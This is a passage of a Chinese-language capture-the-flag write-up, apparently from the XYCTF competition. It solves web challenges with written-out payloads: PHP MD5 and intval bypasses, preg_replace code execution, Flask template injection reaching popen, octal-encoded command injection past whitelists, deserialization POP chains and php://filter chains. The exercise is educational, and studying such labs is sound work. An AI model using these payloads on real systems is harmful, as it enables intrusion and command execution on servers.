<span class="hljs-variable">$level2</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;什么情况,这么基础的md5做不来&quot;</span>);<br>    &#125;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;学这么久,传参不会传?&quot;</span>);<br>&#125;<br><br></code></pre></td></tr></table></figure><p>第一步要传入两个值不等但是md5弱比教相等。尝试传入数组或者用字符串弱比教。</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">val1</span>=QNKCDZO&amp;val2=s878926199a<br></code></pre></td></tr></table></figure><p>第二步传入值的md5的值等于本身。</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">md5</span><span class="hljs-operator">=</span><span class="hljs-number">0</span>e215962017<br></code></pre></td></tr></table></figure><p>第三步可以利用变量覆盖，把原先的覆盖掉，如下图</p><p><img src="/../images/xyctf/warmup.png" alt="warm up"></p><p>，之后进第二个页面</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>]) &amp;&amp; !<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/[0-9]/&#x27;</span>, <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>]) &amp;&amp; <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;操作你O.o&quot;</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>],<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>],<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]);  <span class="hljs-comment">// 我可不会像别人一样设置10来个level</span><br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;有点汗流浃背&quot;</span>);<br>&#125;<br><br></code></pre></td></tr></table></figure><p>简要讲一下intval,这个函数会强制把传入的内容转换为数字，但是如果传入的内容是数组就可以进行绕过。</p><p>先尝试post一个a[]&#x3D;1，会显示出操作你0.o</p><p>再审计一下下面的内容,问问万能的chatgpt这是个啥</p><p>$_GET[‘a’] 作为正则表达式模式，$_GET[‘b’] 作为替换的文本或模式，$_GET[‘c’] 作为输入的字符串或数组。具体来说，这段代码是根据从 URL 中获取的参数来执行正则表达式的搜索和替换操作。</p><p>尝试正则几个字母，然后b输入system(‘cat &#x2F;flag’),c再输入几个前面正则的内容就行</p><p>post传入上面的内容对应，上图片。</p><p><img src="/../images/xyctf/warm1.png" alt="warm1"></p><h2 id="ezMD5"><a href="#ezMD5" class="headerlink" title="ezMD5"></a>ezMD5</h2><p>上传两个图片Md5值相同即可，csdn上面有,可以自己搜，最后能出flag.</p><h2 id="ezMake"><a href="#ezMake" class="headerlink" title="ezMake"></a>ezMake</h2><p>偷偷扫了一下，问题不大吧，&#x2F;flag就能出了<img src="/../images/xyctf/make.png" alt="make"></p><h2 id="ez-make"><a href="#ez-make" class="headerlink" title="ez?make"></a>ez?make</h2><p>本题可以通过两次十六进制绕过，从而得到flag</p><p>先第一次转</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /flag636174202f666c6167<br></code></pre></td></tr></table></figure><p>再转第二次</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">636174202f666c6167</span><span class="hljs-number">363336313734323032663636366336313637</span><br></code></pre></td></tr></table></figure><p>这里提个知识点</p><p>xxd -r 是将十六进制转换回去，-p是以postscript的连续十六进制转储输出。这也叫做纯十六进制转储。</p><p>所有应该为</p><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs coq">`echo <span class="hljs-string">&quot;363336313734323032663636366336313637&quot;</span>|<span class="hljs-type">xxd</span> -r -p|<span class="hljs-type">xxd</span> -r -p`<br></code></pre></td></tr></table></figure><p>&#96;&#96;是执行语句，执行里面的内容</p><p>xxd -r -p用来转化保持。</p><p><img src="/../images/xyctf/ez%EF%BC%9Fmake.png" alt="ez？make"></p><h2 id="我是一个复读机"><a href="#我是一个复读机" class="headerlink" title="我是一个复读机"></a>我是一个复读机</h2><p>首先猜测用户名是admin,给了字典爆破一下，密码是asdqwe</p><p>进去输入常规的sql和ssit和命令执行都不行</p><p>尝试输入汉字有括号，那我估计就是从这里入手，构造一个flask的注入</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stata">哈%<span class="hljs-keyword">print</span>(()|attr(request.<span class="hljs-keyword">args</span>.a))|attr(request.<span class="hljs-keyword">args</span>.base)|attr(request.<span class="hljs-keyword">args</span>.sub)()|attr(request.<span class="hljs-keyword">args</span>.getit)(132)|attr(request.<span class="hljs-keyword">args</span>.ini)|attr(request.<span class="hljs-keyword">args</span>.<span class="hljs-keyword">glo</span>)|attr(request.<span class="hljs-keyword">args</span>.getit)(request.<span class="hljs-keyword">args</span>.p)(request.<span class="hljs-keyword">args</span>.cmd)|attr(request.<span class="hljs-keyword">args</span>.r)()%&amp;a=__class__&amp;base=__base__&amp;sub=__subclasses__&amp;getit=__getitem__&amp;cmd=<span class="hljs-keyword">cat</span> /flag&amp;ini=__init__&amp;<span class="hljs-keyword">glo</span>=__globals__&amp;p=popen&amp;r=<span class="hljs-keyword">read</span><br></code></pre></td></tr></table></figure><p>可以得到flag</p><h2 id="ezrce"><a href="#ezrce" class="headerlink" title="ezrce"></a>ezrce</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">waf</span>(<span class="hljs-params"><span class="hljs-variable">$cmd</span></span>)</span>&#123;<br>    <span class="hljs-variable">$white_list</span> = [<span class="hljs-string">&#x27;0&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>,<span class="hljs-string">&#x27;5&#x27;</span>,<span class="hljs-string">&#x27;6&#x27;</span>,<span class="hljs-string">&#x27;7&#x27;</span>,<span class="hljs-string">&#x27;8&#x27;</span>,<span class="hljs-string">&#x27;9&#x27;</span>,<span class="hljs-string">&#x27;\\&#x27;</span>,<span class="hljs-string">&#x27;\&#x27;&#x27;</span>,<span class="hljs-string">&#x27;$&#x27;</span>,<span class="hljs-string">&#x27;&lt;&#x27;</span>]; <br>    <span class="hljs-variable">$cmd_char</span> = <span class="hljs-title function_ invoke__">str_split</span>(<span class="hljs-variable">$cmd</span>);<br>    <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$cmd_char</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$char</span>)&#123;<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$char</span>, <span class="hljs-variable">$white_list</span>))&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;really ez?&quot;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$cmd</span>;<br>&#125;<br><span class="hljs-variable">$cmd</span>=<span class="hljs-title function_ invoke__">waf</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;cmd&quot;</span>]);<br><span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$cmd</span>);<br></code></pre></td></tr></table></figure><p>本体只能用白名单上的进行绕过，有\有数字估计是八进制，空格用$&lt;进行绕过。</p><p>累了，上payload吧，利用了简要的拼接。</p><p><img src="/../images/xyctf/rce.png" alt="rce"></p><h2 id="ezpop"><a href="#ezpop" class="headerlink" title="ezpop"></a>ezpop</h2><p>对于反序列化不好的我一点也不ez,先看源码分析。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">AAA</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$s</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;you get 2 A &lt;br&gt;&quot;</span>;<br>        <span class="hljs-variable">$p</span> = <span class="hljs-variable language_">$this</span>-&gt;a;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;s-&gt;<span class="hljs-variable">$p</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">BBB</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$c</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$d</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;you get 2 B &lt;br&gt;&quot;</span>;<br>        <span class="hljs-variable">$a</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>];<br>        <span class="hljs-variable">$b</span>=<span class="hljs-variable">$_POST</span>;<br>        <span class="hljs-variable">$c</span>=<span class="hljs-variable language_">$this</span>-&gt;c;<br>        <span class="hljs-variable">$d</span>=<span class="hljs-variable language_">$this</span>-&gt;d;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$b</span>[<span class="hljs-string">&#x27;a&#x27;</span>])) &#123;<br>            <span class="hljs-keyword">unset</span>(<span class="hljs-variable">$b</span>[<span class="hljs-string">&#x27;a&#x27;</span>]);<br>        &#125;<br>        <span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-variable">$a</span>,<span class="hljs-variable">$b</span>)(<span class="hljs-variable">$c</span>)(<span class="hljs-variable">$d</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CCC</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$c</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;you get 2 C &lt;br&gt;&quot;</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;c;<br>    &#125;<br>&#125;<br><br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;xy&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$a</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;xy&#x27;</span>]);<br>    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>(<span class="hljs-string">&quot;noooooob!!!&quot;</span>);<br>&#125; <br></code></pre></td></tr></table></figure><p>还有点长，简单的要分析一下，要得到flag,正常是反向推理。要得到flag大概率是<code>call_user_func($a,$b)($c)($d);</code>这个实现的，简单来说这是个嵌套的函数。<code>__get</code>是调用的成员属性不存在,才会调用。而AAA里的<code>$this-&gt;s-&gt;$p;</code> 可以进行调用一个不存在的从而实现调用。<code>__toString</code>把对象当成字符串调用，通常echo就可以调用成功。<code>echo $this-&gt;c;</code>就可以实现。那么显而易见大概的流程已经出来了。</p><p>CCC::destruct  —&gt; AAA::toString—&gt;BBB::get，这样的大体流程。下面我们上代码。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">AAA</span> </span>&#123;<br>    <br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$s</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>; <br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">BBB</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$c</span>=<span class="hljs-string">&quot;echo system&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$d</span>=<span class="hljs-string">&quot;cat /flag&quot;</span>; <br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CCC</span></span><br><span class="hljs-class"></span>&#123; <span class="hljs-keyword">public</span> <span class="hljs-variable">$c</span>; <br>&#125;<br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> CCC;<br><span class="hljs-variable">$b</span>=<span class="hljs-keyword">new</span> AAA;<br><span class="hljs-variable">$c</span>=<span class="hljs-keyword">new</span> BBB;<br><span class="hljs-variable">$a</span>-&gt;c=<span class="hljs-variable">$b</span>;<br><span class="hljs-variable">$b</span>-&gt;s=<span class="hljs-variable">$c</span>;<br><span class="hljs-variable">$b</span>-&gt;a=<span class="hljs-string">&quot;eval&quot;</span>;<br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><br></code></pre></td></tr></table></figure><p>$a&#x3D;new CCC;实例化调用__destruct(),之后就可以通过echo调用__tostring().里面调用<code>$p = $this-&gt;a;</code></p><p>只要给a赋值BBB不存在的变量然后通过return，就能调用__get().</p><p>这里还要介绍一下implode函数，implode函数可以拼接内容，把后面的$b,c,d连起来构成语句</p><p>$c,$d已经赋值好了，还需要post传值<img src="/../images/xyctf/ezpop.png" alt="ezpop"></p><p>$b也可以传入exec,最后还有个小tip,原文都是2A,2B,2C，需要把类后面的属性即CCC后面的1改成2.</p><p>大题思路是这样，中间可能有冗杂的内容，至少把题目写出来了。</p><h2 id="牢牢记住，逝者为大"><a href="#牢牢记住，逝者为大" class="headerlink" title="牢牢记住，逝者为大"></a>牢牢记住，逝者为大</h2><p><img src="/../images/xyctf/%E7%89%A2%E5%A4%A7.png" alt="牢大"></p><p>so,what can i say,manba out</p><p>这题还是有许多值得学习的知识点的，先简要分析一下。</p><p>cmd的长度不能大于13</p><p>内容禁用的挺多的，如上</p><p>大致思路是需要拼接最后得到的，因为下方有个eval函数。</p><p>既然都禁了那我尝试转义吧，转十六进制可能会出现f,会被禁用，那么我们就转八进制。</p><p><img src="/../images/xyctf/laoda1.png" alt="laoda1"></p><p>处于编码问题我们都是加一个\0,如下</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dns">\<span class="hljs-number">0143\0160</span>\<span class="hljs-number">0040\0057</span>\<span class="hljs-number">0146\0154</span>\<span class="hljs-number">0141\0147</span>\<span class="hljs-number">0040\0057</span>\<span class="hljs-number">0166\0141</span>\<span class="hljs-number">0162\0057</span>\<span class="hljs-number">0167\0167</span>\<span class="hljs-number">0167\0057</span>\<span class="hljs-number">0150\0164</span>\<span class="hljs-number">0155\0154</span>\<span class="hljs-number">0057\0061</span>\<span class="hljs-number">0056\0164</span>\<span class="hljs-number">0170\0164</span>\<span class="hljs-number">0012</span>   ，最后的是换号符<br></code></pre></td></tr></table></figure><p>再看前面要过滤man和mamba out,前面可以考虑换行%0A,后面%23注释掉就行</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mel">?cmd=%0A<span class="hljs-string">`$_GET[1]`</span>;%23&amp;<span class="hljs-number">1</span>=%24(echo -e <span class="hljs-string">&quot;&quot;</span>)<br></code></pre></td></tr></table></figure><p>反引号用于执行，%24是$,echo -e 用于执行转义，加上面的放入下面的代码中就可以实行。最后再切换到1.txt,得到答案。</p><p><img src="/../images/xyctf/lao2.png" alt="lao2"></p><h2 id="以下为复现（-εZ-¿м-Kε¿"><a href="#以下为复现（-εZ-¿м-Kε¿" class="headerlink" title="以下为复现（  εZ?¿м@Kε¿?"></a>以下为复现（  εZ?¿м@Kε¿?</h2><p><a href="https://blog.csdn.net/ZBraveHeart/article/details/123187908?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522171412303116777224485918%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=171412303116777224485918&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-123187908-null-null.142%5Ev100%5Epc_search_result_base1&utm_term=makefile&spm=1018.2226.3001.4187">知识点</a>，写这题之前可以看看这篇的知识点，简要的了解一下。<img src="/../images/xyctf/%CE%B5Z%C2%BF%D0%BC@K%CE%B5%C2%BF.png" alt="εZ¿м@Kε¿"></p><p>尝试了第一种和第二种都不行，看了其他师傅的wp，考察的可能是真的是makefile的知识点，之前也没搜过这方面的内容，就小学一下吧。这里简单的说一下。</p><p>$符号表示取变量的值，当变量名多于一个字符时，使用”( )”<br>$符的其他用法</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><span class="hljs-variable">$^</span> 表示所有的依赖文件<br><span class="hljs-variable">$@</span> 表示生成的目标文件<br><span class="hljs-variable">$&lt;</span> 代表第一个依赖文件<br></code></pre></td></tr></table></figure><p>尝试输入内容。<img src="/../images/xyctf/%EF%BC%9F%EF%BC%9F%EF%BC%9F.png" alt="？？？"></p><p>得知当前的依赖文件里面就是flag.</p><p>$&lt;,显示的是&#x2F;flag，那么&lt;$&lt;也就是&lt;&#x2F;flag,由上面得知多于一个字符需要使用括号，那么就先构造**$(&lt;$&lt;)**,我的理解是取进去flag文件</p><p>里面的值，先输入看看，这是下面的回显。</p><figure class="highlight ocaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ocaml"><span class="hljs-type">Nothing</span> <span class="hljs-keyword">to</span> be <span class="hljs-keyword">done</span> <span class="hljs-keyword">for</span> <span class="hljs-symbol">&#x27;FLAG&#x27;</span>.<br></code></pre></td></tr></table></figure><p>也就是说**$(&lt;$&lt;)**,可能代表的就是flag这个内容，读取我们需要再加个$</p><p><img src="/../images/xyctf/%EF%BC%9F%EF%BC%9F.png" alt="？？"></p><h2 id="连连看到底是连连什么看"><a href="#连连看到底是连连什么看" class="headerlink" title="连连看到底是连连什么看"></a>连连看到底是连连什么看</h2><p>下载文件。先靠着打断点过了一次关发现并不能得到flag,看到文件里面有what’s_this.php，打开网页看看</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><br><span class="hljs-variable">$p</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;p&#x27;</span>];<br><br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/http|=|php|file|:|\/|\?/i&quot;</span>, <span class="hljs-variable">$p</span>))<br>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;waf!&quot;</span>);<br>&#125;<br><br><span class="hljs-variable">$payload</span>=<span class="hljs-string">&quot;php://filter/<span class="hljs-subst">$p</span>/resource=/etc/passwd&quot;</span>;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$payload</span>)===<span class="hljs-string">&quot;XYCTF&quot;</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;/flag&#x27;</span>);<br>&#125; <br></code></pre></td></tr></table></figure><p>看了wp,可以看一下这位师傅讲的原理，<a href="https://blog.csdn.net/m0_73512445/article/details/134627841">filterchain</a>，简单的来说就是就是base64只能识别[A-Za-z0-9+&#x2F;&#x3D;]，这些其他的不可见字符会自动忽略。原理大致就是最后只要解密成为XYCTF就可以了，这里师傅推荐的脚本，<a href="https://github.com/synacktiv/php_filter_chain_generator">脚本</a>，直接clone下来就可以用了构造一下</p><p><img src="/../images/xyctf/%E8%BF%9E%E8%BF%9E%E7%9C%8B.png" alt="连连看"></p><p>然后再脚本跑一下，<img src="/../images/xyctf/%E8%BF%9E%E8%BF%9E%E7%9C%8B1.png" alt="连连看1"></p><p>最后末尾要改一下，根据题目的设定以及要多解几次base64，多修改几次也就得到flag了。</p><p><img src="/../images/xyctf/%E8%BF%9E%E8%BF%9E%E7%9C%8B2.png" alt="连连看2"></p><h2 id="ezSerialize"><a href="#ezSerialize" class="headerlink" title="ezSerialize"></a>ezSerialize</h2><p>哎，看到序列化反序列化就不想写，太菜了，先看下源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;flag.php&#x27;</span>;<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Flag</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$token</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$a</span>, <span class="hljs-variable">$b</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;token = <span class="hljs-variable">$a</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;password = <span class="hljs-variable">$b</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">login</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;token === <span class="hljs-variable language_">$this</span>-&gt;password;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;pop&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$pop</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;pop&#x27;</span>]);<br>    <span class="hljs-variable">$pop</span>-&gt;token=<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-title function_ invoke__">mt_rand</span>());<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$pop</span>-&gt;<span class="hljs-title function_ invoke__">login</span>()) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    &#125;<br>&#125; <br></code></pre></td></tr></table></figure><p>这题第一层其实是原题，是ctfshow上面的，<a href="https://blog.csdn.net/Kracxi/article/details/122887126">链接</a>，由于md5(mt_rand())在变化而且很难爆破，只要让token&#x3D;password就行我们写个代码。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Flag</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$token</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>;<br>&#125;<br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Flag</span>;<br><span class="hljs-variable">$a</span>-&gt;password=&amp;<span class="hljs-variable">$a</span>-&gt;token;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br></code></pre></td></tr></table></figure><p><img src="/../images/xyctf/serialize.png" alt="serialize"></p><p>进入第二层，贴个源码（真的烦啊.jpg</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span 